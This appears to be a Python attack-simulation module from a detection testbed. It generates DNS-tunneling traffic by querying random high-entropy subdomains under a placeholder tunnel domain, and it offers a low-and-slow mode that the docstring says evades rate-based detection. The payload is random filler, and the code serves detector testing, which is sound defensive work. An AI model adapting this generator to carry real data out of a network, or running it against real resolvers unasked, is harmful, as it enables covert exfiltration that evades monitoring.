"""DNS tunneling / exfiltration injector (MITRE T1071.004, T1048.003).

Encodes random payload into long, high-entropy subdomain labels under a tunnel
domain and queries them (TXT/NULL-heavy), the canonical DNS-tunneling fingerprint.
ATTACK_INTENSITY=loud|slow toggles a noisy high-rate channel vs a low-and-slow
one that rate-based detection misses but content features (entropy, length) still
catch.
"""

from __future__ import annotations

import logging
import os
import random
import threading

import dns.resolver

LOG = logging.getLogger("attack.dns_tunnel")
_B32 = "abcdefghijklmnopqrstuvwxyz234567"
TUNNEL_BASE = "t.tunnel.example.local"


def _label(rng: random.Random) -> str:
    return "".join(rng.choice(_B32) for _ in range(rng.randint(28, 45)))


def run(server_ip: str, stop_event: threading.Event) -> None:
    intensity = os.getenv("ATTACK_INTENSITY", "loud").lower()
    burst = (12, 25) if intensity == "loud" else (1, 3)
    gap = (0.2, 0.8) if intensity == "loud" else (4.0, 9.0)
    rng = random.Random(1337)

    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [server_ip]
    resolver.timeout = 2.0
    resolver.lifetime = 3.0

    LOG.warning("DNS tunneling injector active (intensity=%s)", intensity)
    while not stop_event.is_set():
        for _ in range(rng.randint(*burst)):
            qname = f"{_label(rng)}.{TUNNEL_BASE}"
            qtype = rng.choice(["TXT", "TXT", "NULL", "A"])
            try:
                resolver.resolve(qname, qtype)
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                    dns.resolver.NoNameservers, dns.exception.Timeout):
                pass  # the query packet on the wire is the attack; answers are irrelevant
        stop_event.wait(rng.uniform(*gap))
